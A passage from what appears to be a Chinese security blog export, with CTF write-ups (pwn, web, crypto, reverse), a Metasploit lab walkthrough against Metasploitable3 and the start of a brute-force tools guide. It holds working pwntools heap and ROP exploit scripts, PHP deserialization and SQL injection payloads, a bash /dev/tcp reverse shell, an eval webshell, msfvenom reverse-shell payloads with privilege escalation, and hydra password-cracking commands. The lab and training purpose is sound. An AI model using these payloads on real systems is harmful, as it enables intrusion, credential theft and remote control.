libc_base + 0x3c67a8 system = libc_base + 0x45390 print '[*]libc_base : ',hex(libc_base) print '[*]malloc_hook : ',hex(malloc_hook) print '[*]free_hook : ',hex(free_hook) print '[*]one_shot : ',hex(one_shot) print '[*]system : ',hex(system) index = (heap - chunk_list + 8)/0x10 + 15 print '[*]index : ',hex(index) change(2,\"a\"*8+p64(heap+0x10)) create(0x71,\"h\"*0x71)#5 create(0x60,\"e\"*0x60) #6 create(0x60,\"b\"*0x60) #7 #gdb.attach(p) delete(6) delete(7) delete(index) create(0x60,p64(0x6020a8)) #6 create(0x60,\"c\"*0x60) #7 create(0x60,\"/bin/sh\\x00\") #8 payload = p64(free_hook) + p64(0x20) + p64(heap+0x10) payload = payload.ljust(0x60,\"\\x00\") create(0x60, payload) #9 show() change(5,p64(system)) delete(6) p.recv() #gdb.attach(p) p.interactive() exp() 最后成功 getshell babypwn直接read读入0x100直接造成栈溢出，但是这题的难点在于没有泄露函数，不能直接return to libc，所以这里利用ret2_dl_runtime_resolve，之前做过0ctf2018的babystack 跟这个类似，先是尝试了roputils库实现，后来发现有点问题总是调不对，后来直接手工干了一波。操作如下：# -*- coding:utf-8 -*- from pwn import * context.log_level = 'debug' #p = process('./pwn') p = remote(ip,port) elf = ELF('./pwn') read_plt = elf.plt['read'] alarm_plt = elf.plt['alarm'] pop_ebp_ret = 0x080485db ppp_ret = 0x080485d9 pp_ebp_ret = 0x080485da leave_ret = 0x08048448 stack_size = 0x800 bss_addr = 0x0804a040 #readelf -S babystack | grep \".bss\" base_stage = bss_addr + stack_size plt_0 = 0x8048380 # objdump -d -j .plt babystack rel_plt = 0x804833c # objdump -s -j .rel.plt babystack index_offset = (base_stage + 28) - rel_plt alarm_got = elf.got['alarm'] print \"alarm_got: \",hex(alarm_got) print \"alarm_plt: \",hex(alarm_plt) print \"read_plt: \",hex(read_plt) dynsym = 0x80481DC dynstr = 0x804827C fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + align index_dynsym = (fake_sym_addr - dynsym) / 0x10 r_info = index_dynsym &lt;&lt; 8 | 0x7 fake_reloc = p32(alarm_got) + p32(r_info) st_name = fake_sym_addr + 0x10 - dynstr fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12) payload = 'a'*0x28 + p32(bss_addr) payload += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_addr) + p32(36) #raw_input(\"go:\") p.send(payload) #fake stack 1 bss_addr payload1 = 'aaaa' #pop ebp payload1 += p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100) payload1 += p32(pop_ebp_ret) + p32(base_stage) #fake stack again payload1 += p32(leave_ret) #leave: mov esp,ebp; pop ebp p.send(payload1) cmd = \"/bin/sh\" #fake stack 2 base_stage payload2 = 'bbbb' payload2 += p32(plt_0) payload2 += p32(index_offset) payload2 += 'aaaa' payload2 += p32(base_stage + 80) payload2 += 'aaaa' payload2 += 'aaaa' payload2 += fake_reloc #base_stage+28 payload2 += 'b' * align payload2 += fake_sym #base_stage+36 payload2 += \"system\\x00\" payload2 += 'a' * (80 - len(payload2)) payload2 += cmd +'\\x00' #payload2 += 'a' * (100 - len(payload2)) print len(payload2) sleep(1) p.sendline(payload2) #p.sendline(\"icq0030af22ece42d03523c08138525f\") p.interactive() double由于这个对比，只要输入的data相同则不会分配堆块给data，造成两个指针指向同一个data。只要申请两个相同内容大小为smallbin，free掉 一个指针，show另一个指针即可获得libc的地址。同理只要free掉其中一个，在对另一个相同指向的指针进行edit，就可以改变fd。将fd改成malloc_hook，再将malloc_hook的值改成one_gadget即可getshell。详细脚本如下：from pwn import * #context(os='linux',arch='amd64',aslr = 'False',log_level='debug') local = 0 if local: p = process(\"./pwn\") else: p = remote(\"39.97.228.196\",60004) def create(content): p.recvuntil(\"&gt; \") p.sendline(\"1\") sleep(0.1) p.sendline(content) def show(index): p.recvuntil(\"&gt; \") p.sendline(\"2\") p.recv() p.sendline(str(index)) def edit(index,content): p.recvuntil(\"&gt; \") p.sendline(\"3\") p.recv() p.sendline(str(index)) sleep(0.1) p.sendline(content) def free(index): p.recvuntil(\"&gt; \") p.sendline(\"4\") p.recv() p.sendline(str(index)) def exp(): create(\"1\"*0x60) #0 create(\"1\"*0x60) #1 create(\"2\"*0x60) #2 create(\"3\"*0x80) #3 create(\"3\"*0x80) #4 free(3) show(4) if local: pass else: pass #p.recvuntil(\"Info index: \") #p.recvuntil(\"Info index: \") data = u64(p.recvuntil(\"\\n\",drop=True)+\"\\x00\\x00\") libc_base = data - 0x3c4b78 malloc_hook = libc_base + 0x3c4b10 one_shot = libc_base + 0xf02a4 print(\"malloc_hook = \" + str(hex(malloc_hook))) print(\"one_shot = \" + str(hex(one_shot))) free(1) free(2) edit(0,p64(malloc_hook - 19)) create(\"4\"*0x60) create(\"5\"*0x60) payload = \"a\"*3 + p64(one_shot) payload = payload.ljust(0x60,\"\\x00\") create(payload) create(\"icq0030af22ece42d03523c08138525f\") p.interactive() exp() webjustSosohttp://d466a1d4c1214b3181516b834f0de419f413fd793ae942d0.changame.ichunqiu.com/index.php?file=php://filter/read=convert.base64-encode/resource=index.php通过文件包含拿到hint.php和index.php的源码//index.php &lt;html&gt; &lt;?php error_reporting(0); $file = $_GET[\"file\"]; $payload = $_GET[\"payload\"]; if(!isset($file))&#123; echo 'Missing parameter'.'&lt;br&gt;'; &#125; if(preg_match(\"/flag/\",$file))&#123; die('hack attacked!!!'); &#125; @include($file); if(isset($payload))&#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value)&#123; if (preg_match(\"/flag/\",$value)) &#123; die('stop hacking!'); exit(); &#125; &#125; $payload = unserialize($payload); &#125;else&#123; echo \"Missing parameters\"; &#125; ?&gt; &lt;!--Please test index.php?file=xxx.php --&gt; &lt;!--Please get the source of hint.php--&gt; &lt;/html&gt; //hint.php &lt;?php class Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125; &#125; class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) &#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125; &#125; ? parse_url存在绕过的漏洞，例如：http://127.0.0.1///index.php构造payload&lt;?php class Handle&#123; private $handle; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125; &#125; class Flag&#123; public $file; function __construct($file)&#123; $this-&gt;file = $file; &#125; public function getFlag()&#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125; $flag = new Flag('flag.php'); $flag -&gt;token = &amp;$flag -&gt; token_flag; $exp = new Handle($flag); echo urlencode(serialize($exp)).PHP_EOL; ?&gt; 得到以下payloadO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22token_flag%22%3BN%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D urldecode: O:6:\"Handle\":1:&#123;s:14:\".Handle.handle\";O:4:\"Flag\":3:&#123;s:4:\"file\";s:8:\"flag.php\";s:10:\"token_flag\";N;s:5:\"token\";R:4;&#125;&#125; 还要把一个的1改为2，不然会跳进Waking up函数O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22token_flag%22%3BN%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D urldecode: O:6:\"Handle\":2:&#123;s:14:\".Handle.handle\";O:4:\"Flag\":3:&#123;s:4:\"file\";s:8:\"flag.php\";s:10:\"token_flag\";N;s:5:\"token\";R:4;&#125;&#125; cryptopuzzlequestion-0a1:0xfa6 a2:0xbed a3:0x9c7 a4:0xa00 part1看到这三个数都是素数，猜想part1也可能是素数。google到如下的素数表猜测part1所在位置，根据素数之间的间隔相等的原则，猜出part1为26365399 part2脚本也可解：import sympy as sy x = sy.symbols('x') print(sy.integrate(sy.exp(x)*pow(4 + sy.exp(x),2), (x, float(0), sy.log(2)))) rerult : 30.3333333333333 (1+30.3333333≈9*31+7+1)=100 part2 = （1+91+7+1）*77 =7700 hex(7700)=0x1e14 part3part3 = 0x48d0 part4part 4 =hex(40320)=0x9d80 warmup本题是AES_CTR加密，而这个加密方式就是分组对明文进行异或，因为在同一次通信中其中的key和计数器不变，所以明文异或的密钥不会变，因此我们可以在通信过程可以通过输入不同的填充获得密钥。经过测试可以发现，32 个一个分组，flag有两个分组多一些，可以先填充5个让flag加填充满足有3_32个，得到第一个需要的密文data1，然后填充5+48获得第二个密文，第二个密文(data2)有6_32个bit。则详细脚本如下：data1 = \"aefdd88c71194ba242a1e45c7a03f1e8715e11c3566607ee614c8cd4541f3688f0e5a35146b5cca393c8432dafdccee7\" data2 = \"aefdd88c711e46a244bbbc0d2d51f1bb26085d90026603a234188c86184734dff4a9f40244e4c8a0c3cd407eab84d287ec9ece135f9a2a6bc7d427cd18e7c7995985df9d61d1b697d5472b073c27a6b0d5245917d3b1965248a6c228d6f260d4\" s1 = [data1[0:32],data1[32:32*2],data1[32*2:32*3]] s2 = [data2[0:32],data2[32:32*2],data2[32*2:32*3],data2[32*3:32*4],data2[32*4:32*5], data2[32*5:32*6]] ming=\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" minghex=ming.encode(\"hex\") key1=int(s1[0],16)^int(minghex,16) key2=int(s1[1],16)^int(minghex,16) key3=int(s1[2],16)^int(minghex,16) minghex0=int(s2[0],16)^key1 minghex1=int(s2[1],16)^key2 minghex2=int(s2[2],16)^key3 print hex(minghex0)[2:-1].decode(\"hex\") print hex(minghex1)[2:-1].decode(\"hex\") print hex(minghex2)[2:-1].decode(\"hex\") Asymmetric看了一 下题目给的脚本，其实就是普通的RSA题 ,主要还是把n分解剩下就 很简单了 ReEasyGo查看可执行文件格式程序为Go语言编写,内部函数较为复杂，直接IDA动态调试，定位到sub_495150函数，执行完sub_4886B0,程序打印了字符串在sub_48EB00中, 程序调用了输入函数，继续执行，发现函数将一串字符串地址放到了rax，并在接下来的几个CALL中，对其进行了一些操作，这里没有仔细跟进，由于在sub_47E620函数处存在跳转,猜测这里可能为相关的check函数，重点关注其所对应的内存区域，可发现，执行完sub_47E620函数后,可以在内存中直接拿到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"},{"name":"misc","slug":"misc","permalink":"http://yoursite.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"http://yoursite.com/tags/pwn/"},{"name":"crypto","slug":"crypto","permalink":"http://yoursite.com/tags/crypto/"},{"name":"国赛","slug":"国赛","permalink":"http://yoursite.com/tags/国赛/"}]},{"title":"丁牛CTF做题记录","slug":"digapis-ctf-wp","date":"2019-04-19T06:15:16.000Z","updated":"2020-09-17T11:28:52.488Z","comments":true,"path":"2019/04/19/digapis-ctf-wp/","link":"","permalink":"http://yoursite.com/2019/04/19/digapis-ctf-wp/","excerpt":"都是些旧题，加深印象。","text":"都是些旧题，加深印象。 W2-web1这个是bugku上的login2，在响应头可以看到tip解码出来是$sql=\"SELECT username,password FROM admin WHERE username='\".$username.\"'\"; if (!empty($row) &amp;&amp; $row['password']===md5($password))&#123; &#125; 构造payloadusername=1' union select md5(1),md5(1)#&amp;password=1 即可登录成功，登陆成功后可以看到一个命令执行框，反弹个shell即可主机执行nc -lvvp port 然后执行|bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 flag：SKCTF{Uni0n_@nd_c0mM4nD_exEc} W2-web2首先看源代码有个upload.php,但是只能上传jpg，gif，png的格式，url上的file能包含文件进来，但是禁止了php伪协议所以不能读取文件，思路是上传php马然后file包含进来，但是&lt;!--?php和?--&gt;被过滤了payload如下&lt;script language=\"PHP\"&gt; @eval($_POST['a']); &lt;/script&gt; 然后菜刀连上去即可拿到flag：CTF{uP104D_1nclud3_426fh8_is_Fun} W2-web3include(\"flag.php\"); if (isset($_GET['a'])) &#123; if (strcmp($_GET['a'], $flag) == 0) die('Flag: '.$flag); else print 'close to flag';&#125; else&#123; show_source(__FILE__); &#125; ?&gt; strcmp的问题，看这里–&gt;传送门,payload如下a[]=1 flag:CTF{php_trcmp_problems} W2-web4show_source(__FILE__); $username= \"this_is_secret\"; $password= \"this_is_not_known_to_you\"; include(\"flag.php\");//here I changed those two $info = isset($_GET['info'])? $_GET['info']: \"\" ; $data_unserialize = unserialize($info); if ($data_unserialize['username']==$username&amp;&amp;$data_unserialize['password']==$password)&#123; echo $flag; &#125;else&#123; echo \"username or password error!\"; &#125; ?&gt; 构造数组绕过Array ( [username] =&gt; 1 [password] =&gt; 1 ) //序列化后的结果 a:2:&#123;s:8:\"username\";b:1;s:8:\"password\";b:1;&#125; flag:CTF{this_is_flag} W2-web5在1秒后，3秒内正确提交20次即可#-*-coding:utf-8 from selenium.webdriver import Chrome from selenium.webdriver.common.by import By from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC import time driver=Chrome(executable_path=\"D:\\\\Python27\\\\chromedriver.exe\") login_url=\"http://39.98.216.116:32795/\" driver.get(login_url) for i in range(20): print '&lt;--test%d--&gt;'%i list1 = driver.find_elements_by_tag_name('div') tmp = '' for i in list1: tmp += i.text tmp = tmp[:-1] print tmp tmp = 'res = '+tmp exec(tmp) print res list2 = driver.find_elements_by_tag_name(\"input\") list2[0].send_keys(res) time.sleep(1) list2[1].click() flag:ctf{gr3At_cAcu1a7or} W3-web1在响应头的hint可以看到index.php的源码&lt;?php $info = \"\"; $req = []; $flag=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"; ini_set(\"display_error\", false); error_reporting(0); if(!isset($_GET['number']))&#123; header(\"hint:source.txt\"); die(\"have a fun!!\"); &#125; foreach([$_GET, $_POST] as $global_var) &#123; foreach($global_var as $key =&gt; $value) &#123; $value = trim($value); is_string($value) &amp;&amp; $req[$key] = addslashes($value); &#125; &#125; function is_palindrome_number($number) &#123; $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i &lt; $j) &#123; if($number[$i] !== $number[$j]) &#123; return false; &#125; $i++; $j--; &#125; return true; &#125; if(is_numeric($_REQUEST['number']))&#123; $info=\"sorry, you cann't input a number!\"; &#125;elseif($req['number']!=strval(intval($req['number'])))&#123; $info = \"number must be equal to it's integer!! \"; &#125;else&#123; $value1 = intval($req[\"number\"]); $value2 = intval(strrev($req[\"number\"])); if($value1!=$value2)&#123; $info=\"no, this is not a palindrome number!\"; &#125;else&#123; if(is_palindrome_number($req[\"number\"]))&#123; $info = \"nice! &#123;$value1&#125; is a palindrome number!\"; &#125;else&#123; $info=$flag; &#125; &#125; &#125; echo $info; 拿到flag的条件是 不为空，切不能是一个数值型数字，包括小数（由is_numeric函数判断）。 不能是一个回文数（is_palindrome_number判断）。 该数的反转的整数值应该和它本身的整数值相等。目前已知的两种解法是 利用intval函数溢出绕过 用科学计数法构造0=0用第二种方法构造的payload如下number=0e-0%00 flag:CTF{b72dd89e71108245fe21a4c1849ae668}参考–&gt;传送门 W3-web2include \"flag.php\"; error_reporting(0); show_source(__FILE__); $a = @$_REQUEST['hello']; eval(\"var_dump($a);\"); php注入，payload如下);echo%20`cat%20./flag.php`;// flag:flag{92853051ab894a64f7865cf3c2128b34} W3-web5这道题是bugku上的一道注入题，没有过滤，payload如下id=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema = database()# id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name = 'fl4g'# id=-1' union select 1,2,3,(select * from fl4g)# flag:CTF{Sql_INJECT0N_4813drd8hz4} W3-web3查看源代码可以看到页面设置了&lt;html lang=&quot;en&quot;&gt;，可能存在宽字节注入登录框过滤了空格，=，and，但是or，&lt;,&gt;,&#39;,select都没有过滤，同时用户名正确时只会显示password error构造测试payloadusername=admin%df%27or'1'&gt;'1&amp;password=1 username=admin%df%27or'2'&gt;'1&amp;password=1 再替换位置username=admin%df%27or(select(password))&gt;'0&amp;password=1 不断变大后面的字符串就得到密码的md5值51b7a76d51e70b419f60d3473fb6f900，解密得到skctf123456，然后登录拿到flagflag：CTF{b1iNd_SQL_iNJEcti0n!} W3-webcbc字节翻转攻击，首先扫描得到源码的备份文件.index.php.swp $_SESSION['username'] = $info['username']; &#125;else&#123; die(\"ERROR!\"); &#125; &#125; &#125; function show_homepage()&#123; if ($_SESSION[\"username\"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href=\"loginout.php\"&gt;Log out&lt;/a&gt;&lt;/p&gt;'; &#125; if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); &#125; &#125;else&#123; if(isset($_SESSION[\"username\"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class=\"login-body\"&gt; &lt;div id=\"wrapper\"&gt; &lt;div class=\"user-icon\"&gt;&lt;/div&gt; &lt;div class=\"pass-icon\"&gt;&lt;/div&gt; &lt;form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\"&gt; &lt;div class=\"header\"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class=\"content\"&gt; &lt;input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" /&gt; &lt;input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" /&gt; &lt;/div&gt; &lt;div class=\"footer\"&gt; &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125; &#125; ?&gt; admin被禁止登录，但是我们可以利用反序列化漏洞重置$_SESSION[&#39;username&#39;]为admincbc翻转攻击具体可以看师兄的博客–&gt;传送门flag：SKCTF{CBC_wEB_cryptography_6646dfgdg6} W3-misc3下载回来的pdf是经过加密的，加密方法是rot13解密方法cat MinionQuest.pdf | tr 'A-Za-z' 'N-ZA-Mn-za-m' &gt; out.pdf 解密后的pdf有部分被挡住了，用下面的命令提取pdf的图片pdfimages -png result.pdf images 得到完整的图片flag:BITSCTF{save_the_kid}参考–&gt;传送门 W3-misc1下载回来是一个usb流量包，在某一条长度比较大的流量里发现了一张图片dump出来就可以得到flag，微软照片的bug导致我卡了n个小时，上面sublime，下面微软的照片 W3-misc5参考–&gt;传送门","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"},{"name":"misc","slug":"misc","permalink":"http://yoursite.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"metasploit深入学习之ms18_8120&&vsftpd2.3.4","slug":"msf","date":"2019-01-22T12:32:23.000Z","updated":"2020-09-17T11:33:37.031Z","comments":true,"path":"2019/01/22/msf/","link":"","permalink":"http://yoursite.com/2019/01/22/msf/","excerpt":"metasploit是一款非常给力的后渗透系统，本次通过复现vsftpd2.3.4的漏洞和ms18_8120的漏洞来学习metasploit","text":"metasploit是一款非常给力的后渗透系统，本次通过复现vsftpd2.3.4的漏洞和ms18_8120的漏洞来学习metasploit 介绍&emsp;&emsp;首先一点，为什么metaslpoit（下称msf）强大呢，msf本身就有1851个漏洞利用模块，1046个辅助模块，541个漏洞利用模块，44个加密模块（v5.0.1），不仅如此，他还可以调用外部插件，而且本身也是开源的，也可以加载自己写的模块，msf很好但也不是最好的，本次主要是以学习msf为主，当然实验环境下也有更好的入侵方法。&emsp;&emsp;进入msf的命令是msfconsole，如果提示数据库为开启则可以用/etc/init.d/postgresql start开启metasploit的数据库，如果你需要完成一次渗透测试，如果你手上没有合适的工具的话，msf可以完成所有的工作 一、扫描&emsp;&emsp;msf调用nmap扫描的命令是大db_nmap，具体用法和nmap使用差不多，也可以使用msf的扫描模块进行扫描，常用的扫描模块有brute_dirs,dir_listing,dir_scanner。 二、复现&emsp;&emsp;目标主机192.168.1.66:8585上存在一个dav2的上传漏洞，攻击思路大概是我们可以先利用这个上传漏洞上传一个payload，实验入侵主机到进一步提权。首先我们先制作一个payloadroot@kali:~# msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.1.70 lport=13579 -f raw &gt; /root/Desktop/13579.php [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload No encoder or badchars specified, outputting raw payload Payload size: 30656 bytes -p选择payload，lhost是本地ip，lport为本地监听端口，-f格式，&gt;输出为文件 然后我们需要上传脚本，上传脚本会用到davtest这个工具，davtest支持自动发送文件漏洞，目录自动随机帮助隐藏文件，发送文本文件，并尝试移动到可执行文件的名称，上传的文件自动清理，发送任意文件。root@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13579.php -uploadloc 13579.php ******************************************************** Testing DAV connection OPEN SUCCEED: http://192.168.1.66:8585/uploads ******************************************************** unless Uploading file Upload succeeded: http://192.168.1.66:8585/uploads/13579.php -url是网址，-uploadfile是要上传的文件，-uploadloc是要上传的位置。准备好了就可以开始打了root@kali:~# msfconsole -q [-] *** [-] * WARNING: No database support: could not connect to server: Connection refused Is the server running on host \"localhost\" (::1) and accepting TCP/IP connections on port 5432? could not connect to server: Connection refused Is the server running on host \"localhost\" (127.0.0.1) and accepting TCP/IP connections on port 5432? [-] *** [*] Starting persistent handler(s)... msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp payload =&gt; php/meterpreter_reverse_tcp msf5 exploit(multi/handler) &gt; set lport 13579 lport =&gt; 13579 msf5 exploit(multi/handler) &gt; set lhost 192.168.1.70 lhost =&gt; 192.168.1.70 msf5 exploit(multi/handler) &gt; exploit -j -z [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 192.168.1.70:13579 启动msf时-q是不显示封面，exploit -j -z-j是把exploit放到jobs里，-z挂后台，jobs的意思是当监听到反弹的shell之后会建立一个session，然后不会不停下来，继续监听。session的可以理解为一个会话。到这里，我们只需要访问一下我们上传的payload就可以反弹shell了(可以用浏览器访问)curl http://192.168.1.66:8585/uploads/13579.php getshellmsf5 exploit(multi/handler) &gt; [*] Meterpreter session 1 opened (192.168.1.70:13579 -&gt; 192.168.1.66:49816) at 2019-01-22 02:30:29 -0500 [*] Meterpreter session 2 opened (192.168.1.70:13579 -&gt; 192.168.1.66:49817) at 2019-01-22 02:30:31 -0500 meterpreter &gt; background msf5 exploit(multi/handler) &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter php/windows LOCAL SERVICE (0) @ METASPLOITABLE3 192.168.1.70:13579 -&gt; 192.168.1.66:49816 (192.168.1.66) background是返回msf控制台，getshell之后得到的shell是local server的权限，我们上传一个另外一个payload上去get更高权限的shellroot@kali:~/Desktop# msfvenom -p windows/meterpreter_reverse_tcp Lhost=192.168.1.70 lport=13789 -f exe &gt; 13789.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 179779 bytes Final size of exe file: 254976 bytes 上传root@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13789.exe -uploadloc 13789.exe ******************************************************** Testing DAV connection OPEN SUCCEED: http://192.168.1.66:8585/uploads ******************************************************** unless Uploading file Upload succeeded: http://192.168.1.66:8585/uploads/13789.exe msf开启监听,sessions -i 1选择id为1的session，getwd获取当前绝对路径，execute -f执行文件msf5 exploit(multi/handler) &gt; set payload windows/meterpreter_reverse_tcp payload =&gt; windows/meterpreter_reverse_tcp msf5 exploit(multi/handler) &gt; show options msf5 exploit(multi/handler) &gt; set lport 13789 lport =&gt; 13789 msf5 exploit(multi/handler) &gt; exploit -j -z msf5 exploit(multi/handler) &gt; sessions -i 1 [*] Exploit running as background job 1. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 192.168.1.70:13789 msf5 exploit(multi/handler) &gt; sessions -i 1 [*] Starting interaction with 1... meterpreter &gt; getwd C:\\wamp\\www\\uploads meterpreter &gt; execute -f \"C:\\\\wamp\\\\www\\\\uploads\\\\13789.exe\" Process 1372 created. meterpreter &gt; [*] Meterpreter session 3 opened (192.168.1.70:13789 -&gt; 192.168.1.66:50670) at 2019-01-22 02:38:39 -0500 我们用上传的第一个payload执行我们的第二次payload，就可以得到普通用户权限msf5 exploit(multi/handler) &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter php/windows LOCAL SERVICE (0) @ METASPLOITABLE3 192.168.1.70:13579 -&gt; 192.168.1.66:53138 (192.168.1.66) 2 meterpreter x86/windows NT AUTHORITY\\LOCAL SERVICE @ METASPLOITABLE3 192.168.1.70:13789 -&gt; 192.168.1.66:54852 (192.168.1.66) 接下来用ms18_8120提权 msf5 exploit(multi/handler) &gt; use exploit/windows/local/ms18_8120_win32k_privesc msf5 exploit(windows/local/ms18_8120_win32k_privesc) &gt; set session 3 session =&gt; 3 msf5 exploit(windows/local/ms18_8120_win32k_privesc) &gt; exploit [*] Started reverse TCP handler on 192.168.1.70:4444 [*] Sending stage (179779 bytes) to 192.168.1.66 [+] Exploit finished, wait for privileged payload execution to complete. [*] Meterpreter session 4 opened (192.168.1.70:4444 -&gt; 192.168.1.66:50799) at 2019-01-22 02:42:04 -0500 meterpreter &gt; 查看sessions就可以看到普通用户权限变成了system权限msf5 exploit(windows/local/ms18_8120_win32k_privesc) &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter php/windows LOCAL SERVICE (0) @ METASPLOITABLE3 192.168.1.70:13579 -&gt; 192.168.1.66:53138 (192.168.1.66) 2 meterpreter x86/windows NT AUTHORITY\\LOCAL SERVICE @ METASPLOITABLE3 192.168.1.70:13789 -&gt; 192.168.1.66:54852 (192.168.1.66) 3 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ METASPLOITABLE3 192.168.1.70:4444 -&gt; 192.168.1.66:62289 (192.168.1.66) 到此，复现完毕","categories":[],"tags":[]},{"title":"涨姿势！暴力破解方法和工具","slug":"Violent-cracking","date":"2019-01-18T11:39:59.000Z","updated":"2020-09-18T03:38:47.659Z","comments":true,"path":"2019/01/18/Violent-cracking/","link":"","permalink":"http://yoursite.com/2019/01/18/Violent-cracking/","excerpt":"字典虽小，够用就行","text":"字典虽小，够用就行 二、 暴力破解2.1 mysql数据库破解&emsp;&emsp;# 爆破数据库账号密码，数据库必须要开启3306远程登录&emsp;&emsp;&emsp;&emsp;2.1.1 Hydra&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 用户名 -P 字典 服务名 -V&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l root -P dist.txt mysql -V&emsp;&emsp;&emsp;&emsp;2.1.2 HexorBase&emsp;&emsp;&emsp;&emsp;2.1.3 metasploit（search查找模块、back返回）&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/mysql/mysql_login&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# show options&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set host IP地址&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set username 用户&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set PASS_FILE dist.txt&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set port 端口号&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;run 2.2 mysql数据库配置（对外）&emsp;&emsp;&emsp;&emsp;2.2.1 3306端口对外开放&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;grant all privileges on . to ‘root‘@’%’ identified by ‘123456’ with grant option;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;flush privileges;（root，123456）&emsp;&emsp;&emsp;&emsp;2.2.2 Navicat数据库管理软件&emsp;&emsp;&emsp;&emsp;2.2.3 报错解决方案&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;is blocked because of many 